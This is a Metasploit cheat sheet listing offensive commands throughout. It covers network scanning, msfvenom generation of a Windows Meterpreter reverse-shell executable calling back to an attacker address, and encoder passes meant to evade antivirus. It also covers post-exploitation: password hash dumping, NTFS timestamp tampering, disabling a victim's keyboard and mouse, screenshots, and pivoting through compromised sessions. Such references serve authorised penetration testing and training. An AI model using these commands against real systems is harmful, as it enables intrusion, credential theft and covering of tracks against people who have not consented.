# Metasploit Cheat Sheet


## Useful Auxiliary Modules

### Port Scanner
```
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > run
```

### DNS Enumeration
```
msf > use auxiliary/gather/dns_enum
msf > set DOMAIN target.tgt
msf > run
```

### FTP Server
```
msf > use auxiliary/server/ftp
msf > set FTPROOT /tmp/ftproot
msf > run
```

### Proxy Server
```
msf > use auxiliary/server/socks4
msf > run
```

- Any proxied traffic that matches the subnet of a route will be routed through the session specified by route.
- Use proxychains configured for socks4 to route any applications traffic through a Meterpreter session.

## msfvenom

### Generate Payloads
```
$ msfvenom –p [ExploitPath] LHOST=[LocalHost (if reverse conn.)] LPORT=[LocalPort] –f [FormatType]
```

**Example:**
```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=4444 –f exe > met.exe
```

### Format Options (specified with –f)
```
--help-formats – Print out a summary of the specified options
exe – Executable
pl – Perl
rb – Ruby
raw – Raw shellcode
c – C code
```

### Encoding Payloads
```
$ msfvenom –p [Payload] -e [Encoder] -f [FormatType (exe, perl, ruby, raw, c)] -i [EncodeInterations] -o [OutputFilename]
```

**Example:**
```
$ msfvenom –p windows/meterpreter/reverse_tcp -i 5 -e x86/shikata_ga_nai -f exe -o mal.exe
```

## Metasploit Meterpreter

### Base Commands
```
? / help: Display a summary of commands
exit / quit: Exit the Meterpreter session
sysinfo: Show the system name and OS type
shutdown / reboot: Self-explanatory
```

### File System Commands
```
cd: Change directory
lcd: Change directory on local (attacker's) machine
pwd / getwd: Display current working directory
ls: Show the contents of the directory
cat: Display the contents of a file on screen
download / upload: Move files to/from the target machine
mkdir / rmdir: Make / remove directory
edit: Open a file in the default editor (typically vi)
```

### Process Commands
```
getpid: Display the process ID that Meterpreter is running inside
getuid: Display the user ID that Meterpreter is running with
ps: Display process list
kill: Terminate a process given its process ID
execute: Run a given program with the privileges of the process the Meterpreter is loaded in
migrate: Jump to a given destination process ID
  - Target process must have same or lesser privileges
  - Target process may be a more stable process
  - When inside a process, can access any files that process has a lock on
```

### Network Commands
```
ipconfig: Show network interface information
portfwd: Forward packets through TCP session
route: Manage/view the system's routing table
```

### Misc Commands
```
idletime: Display the duration that the GUI of the target machine has been idle
uictl [enable/disable] [keyboard/mouse]: Enable/disable either the mouse or keyboard of the target machine
screenshot: Save as an image a screenshot of the target machine
```

### Additional Modules
```
use [module]: Load the specified module

Example:
use priv: Load the priv module
hashdump: Dump the hashes from the box
timestomp: Alter NTFS file timestamps
```

## Managing Sessions

### Multiple Exploitation
```
msf > exploit -z
msf > exploit –j
```

### Job Management
```
msf > jobs –l
msf > jobs –k [JobID]
```

### Session Management
```
msf > sessions -l
msf > session -i [SessionID]
meterpreter > <Ctrl+Z>
or
meterpreter > background
```

### Routing Through Sessions
```
msf > route add [Subnet to Route To] [Subnet Netmask] [SessionID]
```

## Metasploit Console Basics (msfconsole)

### Module and Payload Management
```
msf > search [regex]
msf > use exploit/[ExploitPath]
msf > set PAYLOAD [PayloadPath]
msf > show options
msf > set [Option] [Value]
msf > exploit
```

### Post Modules from Meterpreter
```
meterpreter > run post/multi/gather/env
```

### Post Modules on a Backgrounded Session
```
msf > use post/windows/gather/hashdump
msf > show options
msf > set SESSION 1
msf > run
```
